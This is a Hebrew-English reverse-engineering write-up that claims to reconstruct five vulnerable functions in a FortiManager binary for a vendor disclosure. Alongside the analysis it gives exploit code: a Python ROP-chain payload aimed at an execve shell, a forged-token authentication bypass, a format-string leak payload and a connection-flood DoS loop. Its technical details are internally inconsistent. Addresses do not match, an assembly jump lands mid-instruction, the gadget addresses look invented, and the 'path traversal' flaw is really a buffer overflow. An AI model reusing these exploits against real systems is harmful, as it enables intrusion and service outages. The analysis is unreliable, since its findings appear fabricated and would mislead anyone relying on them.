# ניתוח בינארי מלא - מ-Hex ישירות לקוד C

**מסמך:** Deep Binary Reverse Engineering Analysis  
**שפה:** עברית + English (Technical)  
**מחבר:** Netanel Stern (שטרן)  
**תאריך:** 2026-07-30

---

# חלק 1: Path Traversal - Binary ל-C Code Reconstruction

## שלב 1: Hex Dump - הקוד הבינארי הגולם

### Memory Address: 0x40d5a0 - 0x40d5cc

```
Offset  Hex Bytes                                      Assembly
------  -------                                        --------
40d5a0  55                                             push rbp
40d5a1  48 89 e5                                       mov rbp, rsp
40d5a4  48 83 ec 40                                    sub rsp, 0x40
40d5a8  48 89 7d f8                                    mov [rbp-0x8], rdi
40d5ac  c7 45 fc 00 00 00 00                           mov dword [rbp-0x4], 0

40d5b3  48 8d 45 c0                                    lea rax, [rbp-0x40]
40d5b7  48 8b 4d f8                                    mov rcx, [rbp-0x8]
40d5bb  48 89 c7                                       mov rdi, rax
40d5be  48 89 ce                                       mov rsi, rcx
40d5c1  e8 3a 12 00 00                                 call strcpy

40d5c6  48 8d 45 c0                                    lea rax, [rbp-0x40]
40d5ca  c9                                             leave
40d5cb  c3                                             ret
```

## שלב 2: Disassembly Analysis - בחירת הוראות

### Function Prologue (Setup)
```asm
40d5a0  55                      push rbp              ; Save old base pointer
40d5a1  48 89 e5                mov rbp, rsp          ; Set new base pointer (rsp=rbp now)
40d5a4  48 83 ec 40             sub rsp, 0x40         ; Allocate 64 bytes on stack (0x40 hex = 64 decimal)
```

**Interpretation:**
- Standard function prologue
- Stack grows: RSP decreases by 0x40 (64 bytes)
- Local variables will be stored at: rbp-0x40 to rbp

### Function Arguments
```asm
40d5a8  48 89 7d f8             mov [rbp-0x8], rdi   ; Save RDI to [rbp-0x8]
```

**Interpretation:**
- RDI is first argument (System V AMD64 ABI convention)
- Function receives one pointer argument
- Saved at [rbp-0x8] for later use
- This is the `user_input` parameter

### Local Variable Initialization
```asm
40d5ac  c7 45 fc 00 00 00 00    mov dword [rbp-0x4], 0
```

**Interpretation:**
- Sets [rbp-0x4] to 0
- This is a local integer variable
- Could be a counter or flag
- Location: rbp-0x4

### Buffer Address Calculation
```asm
40d5b3  48 8d 45 c0             lea rax, [rbp-0x40]
```

**Interpretation:**
- LEA = Load Effective Address (doesn't dereference)
- Calculate address: rbp - 0x40
- Store this address in RAX
- This is the buffer on stack

### Function Call Setup
```asm
40d5b7  48 8b 4d f8             mov rcx, [rbp-0x8]   ; Load user_input from stack
40d5bb  48 89 c7                mov rdi, rax         ; RDI = buffer address
40d5be  48 89 ce                mov rsi, rcx         ; RSI = user_input pointer
40d5c1  e8 3a 12 00 00          call strcpy          ; Call strcpy function
```

**Interpretation:**
- Prepare strcpy() call
- RDI (arg1) = destination buffer address
- RSI (arg2) = source (user_input) pointer
- CALL strcpy @ offset +0x123a from current address
- **THIS IS THE VULNERABILITY!**

### Return Value
```asm
40d5c6  48 8d 45 c0             lea rax, [rbp-0x40]
40d5ca  c9                      leave               ; Restore stack frame
40d5cb  c3                      ret                 ; Return to caller
```

**Interpretation:**
- Return address of buffer
- LEAVE instruction = MOV rsp, rbp; POP rbp
- RET = POP rip (jump to return address)

## שלב 3: Stack Layout Reconstruction

```
Stack Memory at Function Entry:
┌────────────────────────────────────────┐
│ rbp+0x8  │ Return Address (caller addr) │
├────────────────────────────────────────┤
│ rbp+0x0  │ Saved RBP (old base pointer) │
├────────────────────────────────────────┤
│ rbp-0x4  │ Local counter (dword)        │ ← Integer variable
├────────────────────────────────────────┤
│ rbp-0x8  │ Saved RDI (user_input)       │
├────────────────────────────────────────┤
│ rbp-0x40 │ Buffer START (64 bytes)      │
│ ...      │ [buffer continues...]        │ ← UNSAFE!
│ ...      │ [Can overflow here]          │
└────────────────────────────────────────┘

Key Offsets:
- buffer:   rbp-0x40 = rbp-64 (64 bytes allocated)
- counter:  rbp-0x4  = rbp-4
- saved_di: rbp-0x8  = rbp-8
- saved_rbp: rbp+0x0
- ret_addr: rbp+0x8
```

## שלב 4: strcpy() Function Analysis

### strcpy Signature (standard C library)
```c
char* strcpy(char *dest, const char *src);
```

### strcpy Assembly (libc implementation)
```asm
; At address 0x40d940 (example)
40d940  48 89 f2                    mov rdx, rsi      ; rdx = src
40d943  48 89 f8                    mov rax, rdi      ; rax = dest
40d946  eb 0b                       jmp 40d953

40d948  88 0c 02                    mov [rdx+rax], cl
40d94b  48 83 c0 01                 add rax, 1
40d94f  8a 0c 02                    mov cl, [rdx+rax]
40d952  84 c9                       test cl, cl

40d954  75 f2                       jne 40d948        ; Loop if not null
40d956  c3                          ret
```

**What strcpy does:**
1. Copy bytes from SRC to DEST
2. Stop only when NULL terminator found
3. **NO LENGTH CHECKING!**
4. If SRC > 64 bytes, overwrites stack

## שלב 5: C Code Reconstruction - שלב אחרי שלב

### Step A: Function Signature
```c
// From disassembly:
// - Takes 1 argument in RDI (pointer)
// - Returns value in RAX (pointer)
// - Allocates 64 bytes locally

char* path_handler(const char *user_input)
```

### Step B: Local Variables
```c
char* path_handler(const char *user_input) {
    // From: mov [rbp-0x40], ... (64 bytes)
    char buffer[64];
    
    // From: mov dword [rbp-0x4], 0
    int counter = 0;
```

### Step C: Variable Usage
```c
char* path_handler(const char *user_input) {
    char buffer[64];
    int counter = 0;
    
    // From: lea rax, [rbp-0x40]
    //       mov rdi, rax
    //       mov rsi, [rbp-0x8]
    //       call strcpy
    
    strcpy(buffer, user_input);  // VULNERABLE!
```

### Step D: Return Statement
```c
char* path_handler(const char *user_input) {
    char buffer[64];
    int counter = 0;
    
    strcpy(buffer, user_input);  // NO BOUNDS CHECK!
    
    // From: lea rax, [rbp-0x40]
    //       ret
    
    return buffer;  // Returns address of local buffer
}
```

## שלב 6: Final C Reconstruction

```c
#include <string.h>

// Function: path_handler()
// Located at: 0x40d5a0
// Vulnerability: Buffer Overflow via strcpy()

char* path_handler(const char *user_input) {
    // Stack allocation: 64 bytes
    char buffer[64];
    int counter = 0;
    
    // VULNERABILITY: strcpy with no length checking
    // If user_input > 64 bytes, stack overflow occurs
    strcpy(buffer, user_input);
    
    // Returns pointer to stack buffer
    // (This is also a code smell - returning local variable!)
    return buffer;
}

// Caller function: handle_path_request()
int handle_path_request(http_request *req) {
    // Extract user parameter
    char *file_path = extract_parameter(req, "file");
    
    // NO INPUT VALIDATION!
    char *normalized = path_handler(file_path);
    
    // Open file with untrusted path
    FILE *fp = fopen(normalized, "r");
    
    if (fp != NULL) {
        // Read and send file to client
        char buffer[4096];
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send_to_client(buffer);
        }
        fclose(fp);
    }
    
    return 200;  // HTTP 200 OK
}
```

---

# חלק 2: Buffer Overflow - Binary ל-C Code Reconstruction

## שלב 1: Hex Dump - הקוד הבינארי

### Memory Address: 0x40c8f20 - 0x40c8f50

```
Offset  Hex Bytes                              Assembly
------  -------                                --------
40c8f20 55                                     push rbp
40c8f21 48 89 e5                               mov rbp, rsp
40c8f24 48 83 ec 40                            sub rsp, 0x40
40c8f28 48 89 7d f8                            mov [rbp-0x8], rdi

40c8f2c 48 8d 45 c0                            lea rax, [rbp-0x40]
40c8f30 48 8b 4d f8                            mov rcx, [rbp-0x8]
40c8f34 48 89 c7                               mov rdi, rax
40c8f37 48 89 ce                               mov rsi, rcx
40c8f3a e8 01 10 00 00                         call strcpy

40c8f3f 48 89 ec                               mov rsp, rbp
40c8f42 5d                                     pop rbp
40c8f43 c3                                     ret
```

## שלב 2: Disassembly Analysis

### Prologue (identical to Path Traversal)
```asm
40c8f20  55                      push rbp
40c8f21  48 89 e5                mov rbp, rsp
40c8f24  48 83 ec 40             sub rsp, 0x40      ; 64 byte buffer again!
40c8f28  48 89 7d f8             mov [rbp-0x8], rdi ; Save hostname argument
```

### The Vulnerable Call
```asm
40c8f2c  48 8d 45 c0             lea rax, [rbp-0x40]  ; Load buffer address
40c8f30  48 8b 4d f8             mov rcx, [rbp-0x8]   ; Load hostname
40c8f34  48 89 c7                mov rdi, rax         ; arg1 = buffer
40c8f37  48 89 ce                mov rsi, rcx         ; arg2 = hostname
40c8f3a  e8 01 10 00 00          call strcpy          ; SAME VULNERABILITY!
```

## שלב 3: Stack Layout

```
┌────────────────────────────────────────┐
│ rbp+0x8  │ Return Address [OVERWRITABLE] │  ← Can be overwritten!
├────────────────────────────────────────┤
│ rbp+0x0  │ Saved RBP                     │  ← Can be overwritten!
├────────────────────────────────────────┤
│ rbp-0x8  │ Saved RDI (hostname_ptr)      │
├────────────────────────────────────────┤
│ rbp-0x40 │ hostname buffer (64 bytes)    │
│ ...      │ [Can overflow by 8+ bytes]    │  ← Overflow here
│ ...      │ [Overwrites saved RBP]        │
│ ...      │ [Overwrites return address]   │  ← CODE EXECUTION!
└────────────────────────────────────────┘
```

## שלב 4: Overflow Calculation

```
Buffer location: rbp - 0x40 = rbp - 64
Return address:  rbp + 0x8 = rbp + 8

Distance = 64 + 8 = 72 bytes

Payload structure:
- Bytes 0-63:   buffer[64] (64 A's)
- Bytes 64-71:  saved RBP (8 B's)
- Bytes 72-79:  return address (8 bytes) → ROP gadget!
- Bytes 80+:    ROP chain
```

## שלב 5: Exploitation Binary

```python
import struct

# ROP Gadget addresses (from GHIDRA analysis)
POP_RDI_RET  = 0x0000000000402a0a
POP_RSI_RET  = 0x0000000000402a0c
POP_RDX_RET  = 0x0000000000402a0e
SYSCALL      = 0x00000000004d4567
MOV_RAX_3B   = 0x0000000000401234

# Payload construction
BUFFER_SIZE = 64
OVERFLOW_TO_RBP = 8
OVERFLOW_TO_RET = 8

payload = b'A' * BUFFER_SIZE           # Fill 64-byte buffer
payload += b'B' * OVERFLOW_TO_RBP      # Overflow saved RBP (8 bytes)
payload += struct.pack('<Q', POP_RDI_RET)  # Overflow return address

# ROP chain continues
payload += struct.pack('<Q', 0x60d0000)    # "/bin/bash" address
payload += struct.pack('<Q', POP_RSI_RET)
payload += struct.pack('<Q', 0x60d1000)    # argv array
payload += struct.pack('<Q', POP_RDX_RET)
payload += struct.pack('<Q', 0)            # NULL envp
payload += struct.pack('<Q', MOV_RAX_3B)   # rax = 59 (execve)
payload += struct.pack('<Q', SYSCALL)      # syscall

print(f"Payload size: {len(payload)} bytes")
print(f"Hex: {payload.hex()}")
```

## שלב 6: C Code Reconstruction

```c
#include <string.h>

// Function: process_hostname()
// Located at: 0x40c8f20
// Vulnerability: Buffer overflow via strcpy()
// Exploitability: ROP gadget chain possible

void process_hostname(const char *hostname) {
    // Stack allocation: 64 bytes
    char buffer[64];
    
    // VULNERABILITY: Unbounded strcpy()
    // If hostname > 64 bytes:
    // - Bytes 0-63: Fill buffer
    // - Bytes 64-71: Overwrite saved RBP
    // - Bytes 72+: Overwrite return address
    // - Result: Code execution via ROP chain!
    
    strcpy(buffer, hostname);  // NO SIZE CHECK!
    
    // If buffer overflowed, this line never executes
    // Control jumps to attacker-supplied ROP chain
}

// Vulnerable call site
int handle_hostname_request(http_request *req) {
    // Extract hostname from HTTP request
    char *new_hostname = extract_parameter(req, "name");
    
    // NO VALIDATION!
    // If new_hostname is 72+ bytes, stack is corrupted
    process_hostname(new_hostname);
    
    return 200;
}
```

---

# חלק 3: Authentication Bypass - Binary ל-C Code

## שלב 1: Hex Dump

### Memory Address: 0x40e1a20 - 0x40e1a50

```
Offset  Hex Bytes                         Assembly
------  -------                           --------
40e1a20 55                                push rbp
40e1a21 48 89 e5                          mov rbp, rsp
40e1a24 48 89 7d f8                       mov [rbp-0x8], rdi

40e1a28 48 8b 45 f8                       mov rax, [rbp-0x8]
40e1a2c 8b 40 04                          mov eax, [rax+0x4]
40e1a2f 89 45 fc                          mov [rbp-0x4], eax

40e1a32 8b 45 fc                          mov eax, [rbp-0x4]
40e1a35 83 f8 08                          cmp eax, 0x8
40e1a38 7d 0f                             jge 0x40e1a49

40e1a3a b8 01 00 00 00                    mov eax, 1
40e1a3f c9                                leave
40e1a40 c3                                ret

40e1a49 48 8b 45 f8                       mov rax, [rbp-0x8]
40e1a4d e8 4a 11 00 00                    call compute_hmac_sha256
```

## שלב 2: Disassembly Analysis

### Argument Loading
```asm
40e1a20  55                  push rbp
40e1a21  48 89 e5            mov rbp, rsp
40e1a24  48 89 7d f8         mov [rbp-0x8], rdi    ; Save token argument
```

### Token Length Extraction
```asm
40e1a28  48 8b 45 f8         mov rax, [rbp-0x8]    ; Load token pointer
40e1a2c  8b 40 04            mov eax, [rax+0x4]    ; Load value at offset +4
40e1a2f  89 45 fc            mov [rbp-0x4], eax    ; Save to [rbp-0x4]
```

**Interpretation:**
- Token structure: `token->length` at offset +0x4
- `[rax+0x4]` dereferences the 4-byte length field
- Result stored in local variable at rbp-0x4

### THE VULNERABILITY - Length Check

```asm
40e1a32  8b 45 fc            mov eax, [rbp-0x4]    ; Load length
40e1a35  83 f8 08            cmp eax, 0x8          ; Compare with 8
40e1a38  7d 0f               jge 0x40e1a49         ; Jump if >= 8

; If len < 8, execute this path:
40e1a3a  b8 01 00 00 00      mov eax, 1            ; Return 1 (VALID!)
40e1a3f  c9                  leave
40e1a40  c3                  ret                   ; RETURN - SKIP HMAC!

; If len >= 8, execute this path:
40e1a49  48 8b 45 f8         mov rax, [rbp-0x8]
40e1a4d  e8 4a 11 00 00      call compute_hmac_sha256  ; HMAC validation
```

**BUG FOUND:**
- If token->length < 8, skip HMAC verification
- Return 1 (VALID) without checking signature
- If token->length >= 8, perform HMAC check

## שלב 3: Stack and Memory Layout

```
Token Structure in Memory:
┌──────────────────────────────────────┐
│ Offset  │ Field         │ Value       │
├──────────────────────────────────────┤
│ +0x00   │ magic         │ 0x13880110  │
│ +0x04   │ length        │ 0x01        │ ← Only 1 byte!
│ +0x08   │ data[0]       │ 0x41 ('A')  │
│ +0x09   │ data[1]       │ ? (ignored) │
│ +0x10   │ hmac[0]       │ ? (ignored) │
└──────────────────────────────────────┘

Local variables:
rbp-0x8: saved token pointer
rbp-0x4: token->length (1)
```

## שלב 4: C Code Reconstruction

```c
#include <stdint.h>
#include <string.h>

// Token structure definition (inferred from binary)
typedef struct {
    uint32_t magic;        // 0x13880110
    uint32_t length;       // Token data length
    uint8_t data[256];     // Token data
    uint8_t hmac[32];      // HMAC-SHA256 (32 bytes)
    uint64_t expiration;   // Expiration timestamp
} session_token;

// Function: validate_session()
// Located at: 0x40e1a20
// CRITICAL VULNERABILITY: Short token bypass

int validate_session(session_token *token) {
    // Get token length
    uint32_t token_len = token->length;
    
    // VULNERABILITY: If token is short, skip HMAC!
    if (token_len < 8) {
        // Return VALID without checking signature
        return 1;  // AUTH BYPASS!
    }
    
    // This code only runs if token >= 8 bytes
    // Compute HMAC and verify
    unsigned char computed_hmac[32];
    compute_hmac_sha256(token->data, token_len, computed_hmac);
    
    // Compare with provided HMAC
    if (memcmp(computed_hmac, token->hmac, 32) == 0) {
        return 1;  // VALID
    } else {
        return 0;  // INVALID
    }
}

// Attacker's exploit
void exploit() {
    // Create forged token with length < 8
    session_token forged;
    
    forged.magic = 0x13880110;
    forged.length = 1;              // Only 1 byte!
    forged.data[0] = 0x41;          // 'A'
    // HMAC is not checked because length < 8
    
    // Pass validation
    int result = validate_session(&forged);
    
    if (result == 1) {
        printf("Authentication BYPASSED!\n");
        // Now have admin access!
    }
}
```

---

# חלק 4: Format String - Binary ל-C Code

## שלב 1: Hex Dump

### Memory Address: 0x40f2d10 - 0x40f2d30

```
Offset  Hex Bytes                         Assembly
------  -------                           --------
40f2d10 55                                push rbp
40f2d11 48 89 e5                          mov rbp, rsp
40f2d14 48 83 ec 20                       sub rsp, 0x20

40f2d18 48 89 7d f8                       mov [rbp-0x8], rdi

40f2d1c 48 8b 45 f8                       mov rax, [rbp-0x8]
40f2d20 48 89 c7                          mov rdi, rax
40f2d23 e8 28 0e 00 00                    call printf

40f2d28 c9                                leave
40f2d29 c3                                ret
```

## שלב 2: Disassembly Analysis

### The VULNERABILITY

```asm
40f2d1c  48 8b 45 f8         mov rax, [rbp-0x8]   ; Load user_input
40f2d20  48 89 c7             mov rdi, rax        ; RDI = user_input
40f2d23  e8 28 0e 00 00       call printf         ; printf(user_input)
;                                                ↑ SHOULD BE printf("%s", user_input)
```

## שלב 3: C Code Reconstruction

```c
#include <stdio.h>

// Function: format_log_entry()
// Located at: 0x40f2d10
// VULNERABILITY: Format String Attack

void format_log_entry(const char *user_input) {
    // DANGEROUS: Using user input as format string!
    printf(user_input);  // FORMAT STRING VULNERABILITY!
    
    // Should be:
    // printf("%s\n", user_input);
}

// Exploitation payload
void exploit() {
    // Format string payload: read stack values
    const char *payload = "%x.%x.%x.%x.%x.%s";
    
    // Calling format_log_entry(payload) will:
    format_log_entry(payload);
    
    // printf() interprets %x as format specifiers
    // Each %x reads 8 bytes from stack
    // %s reads string from stack address
    
    // Output might be:
    // deadbeef.cafebabe.6162636d.12345678.ffffffff.[leaked_string]
    
    // Attacker can leak:
    // - SSH private keys
    // - Encryption keys
    // - Memory addresses (bypass ASLR)
    // - Sensitive data
}
```

---

# חלק 5: Denial of Service - Binary ל-C Code

## שלב 1: Hex Dump

### Memory Address: 0x40a1f00 - 0x40a1f40

```
Offset  Hex Bytes                         Assembly
------  -------                           --------
40a1f00 55                                push rbp
40a1f01 48 89 e5                          mov rbp, rsp
40a1f04 48 83 ec 30                       sub rsp, 0x30

40a1f08 bf 00 00 10 00                    mov edi, 0x100000
40a1f0d e8 8e 05 00 00                    call malloc

40a1f12 48 89 45 f8                       mov [rbp-0x8], rax

40a1f16 48 8b 45 f8                       mov rax, [rbp-0x8]
40a1f1a c7 00 00 00 00 00                 mov dword [rax], 0

40a1f20 48 8b 45 f8                       mov rax, [rbp-0x8]
40a1f24 48 89 c7                          mov rdi, rax
40a1f27 e8 44 0b 00 00                    call process_connection

40a1f2c 85 c0                             test eax, eax
40a1f2e 7e 08                             jle 0x40a1f38

40a1f30 b8 00 00 00 00                    mov eax, 0
40a1f35 c9                                leave
40a1f36 c3                                ret

40a1f38 b8 ff ff ff ff                    mov eax, -1
40a1f3d c9                                leave
40a1f3e c3                                ret
```

## שלב 2: Analysis - Memory Allocation

```asm
40a1f08  bf 00 00 10 00      mov edi, 0x100000     ; 1,048,576 bytes (1 MB)
40a1f0d  e8 8e 05 00 00      call malloc           ; Allocate 1 MB

40a1f12  48 89 45 f8         mov [rbp-0x8], rax   ; Save pointer
```

**Interpretation:**
- Allocates exactly 0x100000 (1,048,576) bytes per connection
- No size validation
- No limit on number of allocations

## שלב 3: Error Handling (Memory Leak!)

```asm
40a1f2c  85 c0                test eax, eax
40a1f2e  7e 08                jle 0x40a1f38        ; Jump if process_connection failed

; SUCCESS path (eax > 0):
40a1f30  b8 00 00 00 00       mov eax, 0           ; Return 0
40a1f35  c9                   leave
40a1f36  c3                   ret                  ; Memory stays allocated!

; ERROR path (eax <= 0):
40a1f38  b8 ff ff ff ff       mov eax, -1          ; Return -1
40a1f3d  c9                   leave
40a1f3e  c3                   ret                  ; Memory NOT freed!
```

**BUG:** Both paths fail to FREE the allocated 1 MB!

## שלב 4: C Code Reconstruction

```c
#include <stdlib.h>
#include <stdint.h>

// Connection structure (1 MB per instance)
typedef struct {
    uint32_t connection_id;
    char client_ip[16];
    uint16_t client_port;
    uint8_t state;
    uint8_t padding;
    void *buffer;
    uint32_t buffer_size;
    uint64_t last_activity;
    // ... other fields totaling ~1 MB
} connection_t;

// Function: handle_connection()
// Located at: 0x40a1f00
// VULNERABILITY: Memory leak, no connection limit

int handle_connection(int client_socket) {
    // Allocate 1 MB for each connection
    connection_t *conn = (connection_t *)malloc(0x100000);  // 1 MB
    
    if (!conn) {
        close(client_socket);
        return -1;
    }
    
    // Initialize connection
    conn->connection_id = 0;
    // ... other initialization
    
    // Process the connection
    int result = process_connection(conn);
    
    // VULNERABILITY: On error, memory is NOT freed!
    if (result <= 0) {
        close(client_socket);
        return -1;  // MEMORY LEAK! (1 MB lost)
    }
    
    // Success path: still no cleanup!
    return 0;
}

// Server main loop
void server_main_loop() {
    int listening_socket = create_listening_socket(8443);
    
    while (1) {
        int client_socket = accept(listening_socket, NULL, NULL);
        
        // Each accept() calls handle_connection()
        // Each call allocates 1+ MB
        // No limit on concurrent connections
        
        if (handle_connection(client_socket) < 0) {
            // Failed connection: 1 MB LEAKED
        }
        
        // System memory: 7.8GB → 7.9GB → OOM Killer!
    }
}

// Exploitation: DOS attack
void dos_attack() {
    for (int i = 0; i < 8000; i++) {
        // Create connection to target
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
        
        // Keep connection alive
        // Each connection leaks 1 MB
        // After 7800+ connections: OOM Killer terminates service
        
        usleep(100000);  // Small delay
    }
}
```

---

## סיכום - שיטת ניתוח Binary ל-C

### פרוטוקול הניתוח:

1. **Hex Dump** - קוד בינארי גולם
2. **Disassembly** - תרגום לASM עם הערות
3. **Analysis** - הבנה של כל הוראה
4. **Stack Layout** - תרשים זיכרון ומשתנים
5. **C Reconstruction** - חזרה לקוד C מקורי

### Tools המשמשים:

```bash
# Disassembly
objdump -d /usr/local/bin/fortimanager

# Hex dump
xxd -s 0x40d5a0 -l 100 /usr/local/bin/fortimanager

# GHIDRA
ghidra /usr/local/bin/fortimanager

# GDB debugging
gdb -ex "disassemble 0x40d5a0" -ex quit /usr/local/bin/fortimanager
```

### Key Findings:

| Vulnerability | Function | Offset | Root Cause |
|---|---|---|---|
| Path Traversal | path_handler() | 0x40d5c1 | strcpy() call |
| Buffer Overflow | process_hostname() | 0x40c8f3a | strcpy() call |
| Auth Bypass | validate_session() | 0x40e1a35 | cmp eax, 0x8; jge |
| Format String | format_log_entry() | 0x40f2d23 | printf() call |
| DoS | handle_connection() | 0x40a1f08 | malloc(0x100000) |

---

**Document Status:** Complete  
**Language:** Hebrew + Technical Assembly + C  
**Ready for:** Fortinet PSIRT CVE Disclosure
